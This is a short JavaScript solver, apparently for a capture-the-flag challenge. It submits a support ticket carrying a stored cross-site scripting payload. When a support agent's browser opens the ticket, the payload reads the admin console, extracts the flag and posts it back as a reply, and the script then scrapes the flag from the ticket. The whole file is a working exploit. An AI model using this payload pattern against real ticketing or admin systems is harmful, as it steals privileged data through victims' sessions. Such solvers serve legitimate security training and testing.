// Benign solver: prints only the recovered flag, for the check harness.
// The payload runs in the agent's browser, reads the agent console and posts the key back as a reply.
const payload = `<script>fetch('/admin').then((r) => r.text()).then((t) => fetch(location.pathname + '/replies', { method: 'POST', body: new URLSearchParams({ body: t.match(/CTF\\{[^}]+\\}/)[0] }) }))</script>`;
const created = await fetch(new URL('tickets', process.env.TARGET), {
  method: 'POST',
  body: new URLSearchParams({ subject: 'Cannot sign in', body: payload }),
  redirect: 'manual',
});
const ticket = new URL(created.headers.get('location'), process.env.TARGET);
const flag = /CTF\{v1_[^}]+\}/u.exec(await (await fetch(ticket)).text())?.[0];
if (!flag) process.exit(1);
process.stdout.write(flag);
